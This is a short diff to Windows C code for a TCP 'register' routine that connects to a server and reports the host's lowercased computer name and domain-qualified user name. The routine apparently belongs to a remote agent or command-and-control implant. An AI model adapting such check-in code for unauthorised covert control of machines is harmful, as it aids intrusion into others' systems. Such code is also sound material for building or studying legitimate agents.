@@ -8,6 +8,9 @@
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
+#include <ctype.h>
+#define SECURITY_WIN32
+#include <secext.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -147,10 +150,13 @@ int transport_tcp_register(void) {
     g_tcp_sock = tcp_connect();
     if (g_tcp_sock == INVALID_SOCKET) return 0;
 
-    char hostname[128]="UNKNOWN", username[128]="UNKNOWN";
-    DWORD hsz=sizeof(hostname), usz=sizeof(username);
+    char hostname[128]="UNKNOWN", username[256]="UNKNOWN";
+    DWORD hsz=sizeof(hostname);
     GetComputerNameA(hostname, &hsz);
-    GetUserNameA(username, &usz);
+    for (DWORD i = 0; i < hsz; i++) hostname[i] = (char)tolower((unsigned char)hostname[i]);
+    ULONG usz=sizeof(username);
+    if (!GetUserNameExA(2 /*NameSamCompatible*/, username, &usz))
+        GetUserNameA(username, (DWORD*)&usz);
 
     // TCP type 0 = REGISTER
     char body[1024];
